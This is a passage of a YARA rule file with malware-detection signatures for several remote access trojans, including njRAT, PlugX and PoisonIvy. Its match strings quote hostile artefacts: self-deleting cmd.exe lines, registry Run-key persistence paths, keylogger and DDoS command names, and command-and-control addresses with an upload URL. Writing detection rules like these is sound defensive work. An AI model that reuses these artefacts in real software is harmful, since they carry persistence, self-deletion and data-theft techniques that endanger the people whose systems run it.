allowedprogram\" wide\n        $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" wide\n        $s4 = \"yyyy-MM-dd\" wide\n        $v1 = \"cmd.exe /k ping 0 & del\" wide\n        $v2 = \"cmd.exe /c ping 127.0.0.1 & del\" wide\n        $v3 = \"cmd.exe /c ping 0 -n 2 & del\" wide\n\n    condition:\n        all of ($s*) and any of ($v*)\n}\n\nrule njRat_Lime\n{\n    meta:\n        description = \"njRAT lime edition\"\n        classifications = \"Remote Access Trojan\"\n        threat_names = \"njRat Lime\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $a1 = \".Lime\" wide   \n        $a2 = \"Microsoft\\\\MMC\\\\hash\" wide\n        $a3 = \"HKEY_CURRENT_USER\\\\Software\\\\Lime\" wide\n        $a4 = \"Process Hacker\" wide\n        $a5 = \"Process Explorer\" wide\n        $a6 = \"VGAuthService\" wide\n        $a7 = \"VBoxService\" wide\n        $a8 = \"capGetDriverDescriptionA\" wide\n        $a9 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" wide\n        $e1 = \"ddos.slowloris.start\" wide\n        $e2 = \"antiproc\" wide\n        $e3 = \"ddos.ARME.start\" wide\n        $e4 = \"BitcoinON\" wide\n        $e5 = \"botk\" wide\n        $e6 = \"pcspecs\" wide\n        $e7 = \"searchwallet\" wide\n        $e8 = \"Rware\" wide\n\n    condition:\n        uint16(0) == 0x5a4d\n        and pe.imports(\"mscoree.dll\")\n        and 6 of ($a*)\n        and all of ($e*)\n}\n\nrule Pandora\n{\n    meta:\n        description = \"Pandora RAT\"\n        ref = \"http://malwareconfig.com/stats/Pandora\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Pandora\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Pandora\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"Can't get the Windows version\"\n        $b = \"=M=Q=U=Y=]=a=e=i=m=q=u=y=}=\"\n        $c = \"JPEG error #%d\" wide\n        $d = \"Cannot assign a %s to a %s\" wide\n        $g = \"%s, ProgID:\"\n        $h = \"clave\"\n        $i = \"Shell_TrayWnd\"\n        $j = \"melt.bat\"\n        $k = \"\\\\StubPath\"\n        $l = \"\\\\logs.dat\"\n        $m = \"1027|Operation has been canceled!\"\n        $n = \"466|You need to plug-in! Double click to install... |\"\n        $0 = \"33|[Keylogger Not Activated!]\"\n\n    condition:\n        all of them\n}\n\nrule Paradox\n{\n    meta:\n        description = \"Paradox RAT\"\n        ref = \"http://malwareconfig.com/stats/Paradox\"\n        classifications = \"Backdoor\"\n        threat_names = \"Paradox\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Paradox\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"ParadoxRAT\"\n        $b = \"Form1\"\n        $c = \"StartRMCam\"\n        $d = \"Flooders\"\n        $e = \"SlowLaris\"\n        $f = \"SHITEMID\"\n        $g = \"set_Remote_Chat\"\n\n    condition:\n        all of them\n}\n\nrule backdoor_apt_pcclient\n{\n    meta:\n        description = \"PCClient RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PCClient\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@patrickrolsen\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"backdoor_apt_pcclient\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"www.micro1.zyns.com\"\n        $string2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\"\n        $string3 = \"msacm32.drv\" wide\n        $string4 = \"C:\\\\Windows\\\\Explorer.exe\" wide\n        $string5 = \"Elevation:Administrator!\" wide\n        $string6 = \"C:\\\\Users\\\\cmd\\\\Desktop\\\\msacm32\\\\Release\\\\msacm32.pdb\"\n\n    condition:\n        uint16(0) == 0x5a4d and 4 of ($string*)\n}\n\nrule apt_c16_win64_dropper\n{\n    meta:\n        description = \"PCClient RAT dropper\"\n        ref = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"PCClient\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@dragonthreatlab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_c16_win64_dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"clbcaiq.dll\" ascii\n        $str2 = \"profapi_104\" ascii\n        $str3 = \"\\\\Microsoft\\\\wuauclt\\\\wuauclt.dat\" ascii\n        $str4 = { 0F B6 0A 48 FF C2 80 E9 03 80 F1 03 49 FF C8 88 4A FF 75 EC }\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($str*)\n}\n\nrule apt_c16_win_disk_pcclient\n{\n    meta:\n        description = \"PCClient RAT\"\n        ref = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"PCClient\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@dragonthreatlab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_c16_win_disk_pcclient\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $header = {51 5C 96 06 03 06 06 06 0A 06 06 06 FF FF 06 06 BE 06 06 06 06 06 06 06 46 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 EE 06 06 06 10 1F BC 10 06 BA 0D D1 25 BE 05 52 D1 25 5A 6E 6D 73 26 76 74 6F 67 74 65 71 26 63 65 70 70 6F 7A 26 64 69 26 74 79 70 26 6D 70 26 4A 4F 53 26 71 6F 6A 69 30 11 11 0C 2A 06 06 06 06 06 06 06 73 43 96 1B 37 24 00 4E 37 24 00 4E 37 24 00 4E BA 40 F6 4E 39 24 00 4E 5E 41 FA 4E 33 24 00 4E 5E 41 FC 4E 39 24 00 4E 37 24 FF 4E 0D 24 00 4E FA 31 A3 4E 40 24 00 4E DF 41 F9 4E 36 24 00 4E F6 2A FE 4E 38 24 00 4E DF 41 FC 4E 38 24 00 4E 54 6D 63 6E 37 24 00 4E 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 56 49 06 06 52 05 09 06 5D 87 8C 5A 06 06 06 06 06 06 06 06 E6 06 10 25 0B 05 08 06 06 1C 06 06 06 1A 06 06 06 06 06 06 E5 27 06 06 06 16 06 06 06 36 06 06 06 06 06 16 06 16 06 06 06 04 06 06 0A 06 06 06 06 06 06 06 0A 06 06 06 06 06 06 06 06 76 06 06 06 0A 06 06 06 06 06 06 04 06 06 06 06 06 16 06 06 16 06 06}\n\n    condition:\n        $header at 0\n}\n\nrule apt_c16_win32_dropper\n{\n    meta:\n        description = \"PCClient RAT dropper\"\n        ref = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"PCClient\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@dragonthreatlab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_c16_win32_dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"clbcaiq.dll\" ascii\n        $str2 = \"profapi_104\" ascii\n        $str3 = \"/ShowWU\" ascii\n        $str4 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\" ascii\n        $str5 = {8A 08 2A CA 32 CA 88 08 40 4E 75 F4 5E}\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($str*)\n}\n\nrule Plasma\n{\n    meta:\n        description = \"Plasma RAT\"\n        ref = \"http://malwareconfig.com/stats/Plasma\"\n        classifications = \"Backdoor\"\n        threat_names = \"Plasma\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Plasma\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"Miner: Failed to Inject.\" wide\n        $b = \"Started GPU Mining on:\" wide\n        $c = \"BK: Hard Bot Killer Ran Successfully!\" wide\n        $d = \"Uploaded Keylogs Successfully!\" wide\n        $e = \"No Slowloris Attack is Running!\" wide\n        $f = \"An ARME Attack is Already Running on\" wide\n        $g = \"Proactive Bot Killer Enabled!\" wide\n        $h = \"PlasmaRAT\" wide ascii\n        $i = \"AntiEverything\" wide ascii\n\n    condition:\n        all of them\n}\n\nrule Korplug_FAST\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        classifications = \"Trojan, Backdoor, Spyware\"\n        threat_names = \"PlugX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Korplug_FAST\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%s\\\\rundll32.exe \\\"%s\\\", ShadowPlay\" fullword ascii\n        $a1 = \"ShadowPlay\" fullword ascii\n        $s1 = \"%s\\\\rundll32.exe \\\"%s\\\",\" fullword ascii\n        $s2 = \"nvdisps.dll\" fullword ascii\n        $s3 = \"%snvdisps.dll\" fullword ascii\n        $s4 = \"\\\\winhlp32.exe\" fullword ascii\n        $s5 = \"nvdisps_user.dat\" fullword ascii\n        $s6 = \"%snvdisps_user.dat\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and ($x1 or ($a1 and 1 of ($s*)) or 4 of ($s*))\n}\n\nrule Korplug\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        ref = \"http://www.symantec.com/connect/blogs/new-sample-backdoorkorplug-signed-stolen-certificate\"\n        classifications = \"Trojan, Backdoor, Spyware\"\n        threat_names = \"PlugX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"https://github.com/reed1713\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Korplug\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\"\n        $eventid = \"4688\"\n        $data = \"ProgramData\\\\RasTls\\\\RasTls.exe\"\n        $type1 = \"Microsoft-Windows-Security-Auditing\"\n        $eventid1 = \"4688\"\n        $data1 = \"ProgramData\\\\RasTls\\\\rundll32.exe\"\n        $type2 = \"Microsoft-Windows-Security-Auditing\"\n        $eventid2 = \"4688\"\n        $data2 = \"ProgramData\\\\RasTls\\\\svchost.exe\"\n\n    condition:\n        all of them\n}\n\nrule APTGroupX_PlugXTrojanLoader_StringDecode\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        ref = \"https://t.co/4xQ8G2mNap\"\n        classifications = \"Trojan, Backdoor, Spyware\"\n        threat_names = \"PlugX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jay DiMartino\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APTGroupX_PlugXTrojanLoader_StringDecode\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $byte1 = { 8A [2-4] 8A [2-4] FF 05 00 30 00 10 [0-5] 2A [1-6] 80 [2-7] 02 [1-6] 88 0? }\n        $byte2 = { 8B [2-4] 8A [2-4] FF 05 00 30 00 10 [0-5] 2A [1-6] 80 [2-7] 02 [1-6] 88 0? }\n\n    condition:\n        any of them\n}\n\nrule PlugX_J16_Gen\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        classifications = \"Trojan, Backdoor, Spyware\"\n        threat_names = \"PlugX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PlugX_J16_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%WINDIR%\\\\SYSTEM32\\\\SERVICES.EXE\" fullword wide\n        $x2 = \"\\\\\\\\.\\\\PIPE\\\\RUN_AS_USER(%d)\" fullword wide\n        $x3 = \"LdrLoadShellcode\" fullword ascii\n        $x4 = \"Protocol:[%4s], Host: [%s:%d], Proxy: [%d:%s:%d:%s:%s]\" fullword ascii\n        $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\User Agent\\\\Post Platform\" fullword wide\n        $s2 = \"%s\\\\msiexec.exe %d %d\" fullword wide\n        $s3 = \"l%s\\\\sysprep\\\\CRYPTBASE.DLL\" fullword wide\n        $s4 = \"%s\\\\msiexec.exe UAC\" fullword wide\n        $s5 = \"CRYPTBASE.DLL\" fullword wide\n        $s6 = \"%ALLUSERSPROFILE%\\\\SxS\" fullword wide\n        $s7 = \"%s\\\\sysprep\\\\sysprep.exe\" fullword wide\n        $s8 = \"\\\\\\\\.\\\\pipe\\\\a%d\" fullword wide\n        $s9 = \"\\\\\\\\.\\\\pipe\\\\b%d\" fullword wide\n        $s10 = \"EName:%s,EAddr:0x%p,ECode:0x%p,EAX:%p,EBX:%p,ECX:%p,EDX:%p,ESI:%p,EDI:%p,EBP:%p,ESP:%p,EIP:%p\" fullword ascii\n        $s11 = \"Mozilla/4.0 (compatible; MSIE \" fullword wide\n        $s12 = \"; Windows NT %d.%d\" fullword wide\n        $s13 = \"SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Version Vector\" fullword wide\n        $s14 = \"\\\\bug.log\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and (1 of ($x*) or 4 of ($s*))) or (8 of them)\n}\n\nrule PlugX_J16_Gen2\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        classifications = \"Trojan, Backdoor, Spyware\"\n        threat_names = \"PlugX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PlugX_J16_Gen2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"XPlugKeyLogger.cpp\" fullword ascii\n        $s2 = \"XPlugProcess.cpp\" fullword ascii\n        $s4 = \"XPlgLoader.cpp\" fullword ascii\n        $s5 = \"XPlugPortMap.cpp\" fullword ascii\n        $s8 = \"XPlugShell.cpp\" fullword ascii\n        $s11 = \"file: %s, line: %d, error: [%d]%s\" fullword ascii\n        $s12 = \"XInstall.cpp\" fullword ascii\n        $s13 = \"XPlugTelnet.cpp\" fullword ascii\n        $s14 = \"XInstallUAC.cpp\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and (2 of ($s*))) or (5 of them)\n}\n\nrule Codoso_PlugX_3\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        threat_names = \"PlugX\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PlugX_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password.\" fullword wide\n        $s2 = \"mcs.exe\" fullword ascii\n        $s3 = \"McAltLib.dll\" fullword ascii\n        $s4 = \"WinRAR self-extracting archive\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1200KB and all of them\n}\n\nrule Codoso_PlugX_2\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        threat_names = \"PlugX\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PlugX_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%TEMP%\\\\HID\" fullword wide\n        $s2 = \"%s\\\\hid.dll\" fullword wide\n        $s3 = \"%s\\\\SOUNDMAN.exe\" fullword wide\n        $s4 = \"\\\"%s\\\\SOUNDMAN.exe\\\" %d %d\" fullword wide\n        $s5 = \"%s\\\\HID.dllx\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 3 of them) or all of them\n}\n\nrule Codoso_PlugX_1\n{\n    meta:\n        description = \"PlugX / Korplug RAT\"\n        threat_names = \"PlugX\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PlugX_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"GETPASSWORD1\" fullword ascii\n        $s2 = \"NvSmartMax.dll\" fullword ascii\n        $s3 = \"LICENSEDLG\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule PoisonIvy_Sample_APT\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_APT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"pidll.dll\" fullword ascii\n        $s1 = \"sens32.dll\" fullword wide\n        $s3 = \"FileDescription\" fullword wide\n        $s4 = \"OriginalFilename\" fullword wide\n        $s5 = \"ZwSetInformationProcess\" fullword ascii\n        $s9 = \"Microsoft Media Device Service Provider\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 47KB and all of them\n}\n\nrule PoisonIvy_Sample_APT_2\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_APT_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"pidll.dll\" fullword ascii\n        $s1 = \"sens32.dll\" fullword wide\n        $s2 = \"9.0.1.56\" fullword wide\n        $s3 = \"FileDescription\" fullword wide\n        $s4 = \"OriginalFilename\" fullword wide\n        $s5 = \"ZwSetInformationProcess\" fullword ascii\n        $s6 = \"\\\"%=%14=\" fullword ascii\n        $s7 = \"091A1G1R1_1g1u1z1\" fullword ascii\n        $s8 = \"gHsMZz\" fullword ascii\n        $s9 = \"Microsoft Media Device Service Provider\" fullword wide\n        $s10 = \"Copyright (C) Microsoft Corp.\" fullword wide\n        $s11 = \"MFC42.DLL\" fullword ascii\n        $s12 = \"MSVCRT.dll\" fullword ascii\n        $s13 = \"SpecialBuild\" fullword wide\n        $s14 = \"PrivateBuild\" fullword wide\n        $s15 = \"Comments\" fullword wide\n        $s16 = \"040904b0\" fullword wide\n        $s17 = \"LegalTrademarks\" fullword wide\n        $s18 = \"CreateThread\" fullword ascii\n        $s19 = \"ntdll.dll\" fullword ascii\n        $s20 = \"_adjust_fdiv\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 47KB and all of them\n}\n\nrule PoisonIvy_Sample_APT_3\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_APT_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\notepad.exe\" fullword ascii\n        $s1 = \"\\\\RasAuto.dll\" fullword ascii\n        $s3 = \"winlogon.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule PoisonIvy_Sample_APT_4\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_APT_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Microsoft Software installation Service\" fullword wide\n        $s1 = \"idll.dll\" fullword ascii\n        $s2 = \"mgmts.dll\" fullword wide\n        $s3 = \"Microsoft(R) Windows(R)\" fullword wide\n        $s4 = \"ServiceMain\" fullword ascii\n        $s5 = \"Software installation Service\" fullword wide\n        $s6 = \"SetServiceStatus\" fullword ascii\n        $s7 = \"OriginalFilename\" fullword wide\n        $s8 = \"ZwSetInformationProcess\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 7 of them\n}\n\nrule PoisonIvy_Sample_5\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Microsoft Software installation Service\" fullword wide\n        $s2 = \"pidll.dll\" fullword ascii\n        $s3 = \"\\\\mspmsnsv.dll\" fullword ascii\n        $s4 = \"\\\\sfc.exe\" fullword ascii\n        $s13 = \"ServiceMain\" fullword ascii\n        $s15 = \"ZwSetInformationProcess\" fullword ascii\n        $s17 = \"LookupPrivilegeValueA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PoisonIvy_Sample_6\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"124.133.252.150\" fullword ascii\n        $x3 = \"http://124.133.254.171/up/up.asp?id=%08x&pcname=%s\" fullword ascii\n        $z1 = \"\\\\temp\\\\si.txt\" fullword ascii\n        $z2 = \"Daemon Dynamic Link Library\" fullword wide\n        $z3 = \"Microsoft Windows CTF Loader\" fullword wide\n        $z4 = \"\\\\tappmgmts.dll\" fullword ascii\n        $z5 = \"\\\\appmgmts.dll\" fullword ascii\n        $s0 = \"%USERPROFILE%\\\\AppData\\\\Local\\\\Temp\\\\Low\\\\ctfmon.log\" fullword ascii\n        $s1 = \"%USERPROFILE%\\\\AppData\\\\Local\\\\Temp\\\\ctfmon.tmp\" fullword ascii\n        $s2 = \"\\\\temp\\\\ctfmon.tmp\" fullword ascii\n        $s3 = \"SOFTWARE\\\\Classes\\\\http\\\\shell\\\\open\\\\commandV\" fullword ascii\n        $s4 = \"CONNECT %s:%i HTTP/1.0\" fullword ascii\n        $s5 = \"start read histry key\" fullword ascii\n        $s6 = \"Content-Disposition: form-data; name=\\\"%s\\\"; filename=\\\"%s\\\"\" fullword ascii\n        $s7 = \"[password]%s\" fullword ascii\n        $s8 = \"Daemon.dll\" fullword ascii\n        $s9 = \"[username]%s\" fullword ascii\n        $s10 = \"advpack\" fullword ascii\n        $s11 = \"%s%2.2X\" fullword ascii\n        $s12 = \"advAPI32\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and 1 of ($x*)) or (8 of ($s*)) or (1 of ($z*) and 3 of ($s*))\n}\n\nrule PoisonIvy_Sample_7\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Sample_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Microsoft Software installation Service\" fullword wide\n        $s2 = \"pidll.dll\" fullword ascii\n        $s10 = \"ServiceMain\" fullword ascii\n        $s11 = \"ZwSetInformationProcess\" fullword ascii\n        $s12 = \"Software installation Service\" fullword wide\n        $s13 = \"Microsoft(R) Windows(R) Operating System\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PoisonIvy_RAT_ssMUIDLL\n{\n    meta:\n        description = \"PoisonIvy RAT DLL\"\n        ref = \"http://goo.gl/WiwtYT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth (with the help of yarGen and Binarly)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_RAT_ssMUIDLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ssMUIDLL.dll\" fullword ascii\n        $op1 = { 6a 00 c6 07 e9 ff d6 }\n        $op2 = { 02 cb 6a 00 88 0f ff d6 47 ff 4d fc 75 }\n        $op3 = { 6a 00 88 7f 02 ff d6 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and (all of ($op*))) or (all of them)\n}\n\nrule PoisonIvy_Generic_3\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoisonIvy_Generic_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $k1 = \"Tiger324{\" fullword ascii\n        $s2 = \"WININET.dll\" fullword ascii\n        $s3 = \"mscoree.dll\" fullword wide\n        $s4 = \"WS2_32.dll\" fullword\n        $s5 = \"Explorer.exe\" fullword wide\n        $s6 = 